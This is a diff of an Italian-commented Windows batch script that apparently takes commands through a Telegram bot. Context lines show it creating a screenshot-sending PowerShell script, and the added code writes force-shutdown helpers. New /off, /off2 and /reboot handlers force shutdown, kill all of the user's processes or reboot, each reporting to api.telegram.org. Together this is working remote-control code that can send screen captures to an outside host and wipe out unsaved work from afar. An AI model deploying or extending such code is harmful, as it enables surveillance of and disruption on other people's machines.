@@ -78,13 +78,27 @@ echo     Start-Sleep -Seconds $sleepTime >> "%temp%\screenshot_sender.ps1"
 echo } >> "%temp%\screenshot_sender.ps1"
 
 :: ============================================
-:: CREAZIONE SCRIPT DI SPEGNIMENTO
+:: CREAZIONE SCRIPT DI SPEGNIMENTO ISTANTANEO
 :: ============================================
+:: Metodo 1: Shutdown forzato immediato
 (
 echo @echo off
-echo echo Spegnimento computer in corso...
 echo shutdown /s /f /t 0
 ) > "%temp%\shutdown_now.bat"
+
+:: Metodo 2: Comando diretto per spegnimento istantaneo
+(
+echo @echo off
+echo echo Spegnimento immediato...
+echo rundll32.exe powrprof.dll,SetSuspendState 0,1,0
+) > "%temp%\shutdown_force.bat"
+
+:: Metodo 3: Kill processi e spegnimento (più drastico)
+(
+echo @echo off
+echo taskkill /F /FI "USERNAME eq %username%" /IM * 2^>nul
+echo shutdown /s /f /t 0
+) > "%temp%\shutdown_kill.bat"
 
 :: ============================================
 :: SE ARGOMENTO "listener" AVVIA SOLO IL LISTENER
@@ -162,10 +176,38 @@ for /f "usebackq tokens=1,* delims=	" %%A in ("%TMP_TSV%") do (
     
     if /i "!TEXT!"=="/off" (
         echo [COMANDO] Spegnimento immediato richiesto...
-        powershell -NoProfile -WindowStyle Hidden -Command "Add-Type -AssemblyName PresentationFramework; [System.Windows.MessageBox]::Show('Spegnimento del computer in 3 secondi...', 'SHUTDOWN', 'OK', 'Error') | Out-Null"
-        curl.exe -s -X POST "https://api.telegram.org/bot%BOT_TOKEN%/sendMessage" -d chat_id=%CHAT_ID% -d text="⚠️ SPEGNIMENTO IMMEDIATO IN CORSO ⚠️"
-        timeout /t 2 /nobreak >nul
-        start /B "%temp%\shutdown_now.bat"
+        powershell -NoProfile -WindowStyle Hidden -Command "Add-Type -AssemblyName PresentationFramework; [System.Windows.MessageBox]::Show('SPEGNIMENTO IMMEDIATO DEL COMPUTER!', 'SHUTDOWN', 'OK', 'Error') | Out-Null"
+        curl.exe -s -X POST "https://api.telegram.org/bot%BOT_TOKEN%/sendMessage" -d chat_id=%CHAT_ID% -d text="🔴 SPEGNIMENTO IMMEDIATO 🔴 Il computer si spegnerà ora."
+        
+        :: Spegnimento istantaneo con metodo diretto
+        start /B cmd.exe /c "shutdown /s /f /t 0"
+        
+        :: Backup: se shutdown fallisce, usa metodo alternativo
+        timeout /t 1 /nobreak >nul
+        start /B cmd.exe /c "rundll32.exe powrprof.dll,SetSuspendState 0,1,0"
+        
+        :: Backup finale: kill processi e spegni
+        timeout /t 1 /nobreak >nul
+        start /B cmd.exe /c "taskkill /F /IM explorer.exe & shutdown /s /f /t 0"
+        
+        exit
+    )
+    
+    if /i "!TEXT!"=="/off2" (
+        echo [COMANDO] Spegnimento forzato con kill processi...
+        powershell -NoProfile -WindowStyle Hidden -Command "Add-Type -AssemblyName PresentationFramework; [System.Windows.MessageBox]::Show('KILL ALL PROCESS + SHUTDOWN', 'SHUTDOWN', 'OK', 'Error') | Out-Null"
+        curl.exe -s -X POST "https://api.telegram.org/bot%BOT_TOKEN%/sendMessage" -d chat_id=%CHAT_ID% -d text="💀 KILL ALL + SHUTDOWN 💀"
+        
+        :: Uccidi tutti i processi dell'utente e spegni
+        start /B cmd.exe /c "for /f ""skip=3"" %i in ('tasklist /FI ""USERNAME eq %username%"" /NH') do taskkill /F /PID %i 2>nul & shutdown /s /f /t 0"
+        exit
+    )
+    
+    if /i "!TEXT!"=="/reboot" (
+        echo [COMANDO] Riavvio immediato...
+        powershell -NoProfile -WindowStyle Hidden -Command "Add-Type -AssemblyName PresentationFramework; [System.Windows.MessageBox]::Show('RIAVVIO IMMEDIATO!', 'REBOOT', 'OK', 'Warning') | Out-Null"
+        curl.exe -s -X POST "https://api.telegram.org/bot%BOT_TOKEN%/sendMessage" -d chat_id=%CHAT_ID% -d text="🔄 RIAVVIO IMMEDIATO 🔄"
+        start /B cmd.exe /c "shutdown /r /f /t 0"
         exit
     )
     
@@ -175,8 +217,8 @@ for /f "usebackq tokens=1,* delims=	" %%A in ("%TMP_TSV%") do (
     )
     
     if /i "!TEXT!"=="/help" (
-        curl.exe -s -X POST "https://api.telegram.org/bot%BOT_TOKEN%/sendMessage" -d chat_id=%CHAT_ID% -d text="Comandi disponibili: /stop - Arresta il bot /off - Spegni il computer /status - Stato del bot /help - Questo messaggio"
-        powershell -NoProfile -WindowStyle Hidden -Command "Add-Type -AssemblyName PresentationFramework; [System.Windows.MessageBox]::Show('Comandi disponibili:' + [Environment]::NewLine + '/stop - Arresta il bot' + [Environment]::NewLine + '/off - Spegni il computer' + [Environment]::NewLine + '/status - Stato del bot' + [Environment]::NewLine + '/help - Questo messaggio', 'Help', 'OK', 'Information') | Out-Null"
+        curl.exe -s -X POST "https://api.telegram.org/bot%BOT_TOKEN%/sendMessage" -d chat_id=%CHAT_ID% -d text="Comandi disponibili: /stop - Arresta bot /off - Spegni PC /off2 - Spegni PC kill processi /reboot - Riavvia PC /status - Stato /help - Aiuto"
+        powershell -NoProfile -WindowStyle Hidden -Command "Add-Type -AssemblyName PresentationFramework; [System.Windows.MessageBox]::Show('Comandi:' + [Environment]::NewLine + '/stop - Arresta bot' + [Environment]::NewLine + '/off - Spegni PC' + [Environment]::NewLine + '/off2 - Spegni PC (kill all)' + [Environment]::NewLine + '/reboot - Riavvia PC' + [Environment]::NewLine + '/status - Stato' + [Environment]::NewLine + '/help - Aiuto', 'Help', 'OK', 'Information') | Out-Null"
     )
     
     :: Aggiorna offset
